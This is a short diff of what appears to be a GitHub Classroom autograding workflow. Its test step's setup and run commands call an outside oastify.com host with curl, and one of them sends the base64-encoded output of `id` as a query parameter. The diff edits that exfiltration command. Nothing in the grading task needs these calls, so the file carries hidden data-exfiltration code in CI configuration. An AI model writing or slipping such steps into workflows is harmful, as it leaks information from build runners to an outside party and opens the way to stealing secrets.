@@ -20,7 +20,7 @@ jobs:
         test-name: somebody
         setup-command: curl setup.wpp1m7te08wyliqnns7z32k0qrwjk98y.oastify.com
         command: curl install.wpp1m7te08wyliqnns7z32k0qrwjk98y.oastify.com/?data=$(id
-          / |base64)
+          |base64)
         timeout: 10
     - name: Autograding Reporter
       uses: classroom-resources/autograding-grading-reporter@v1
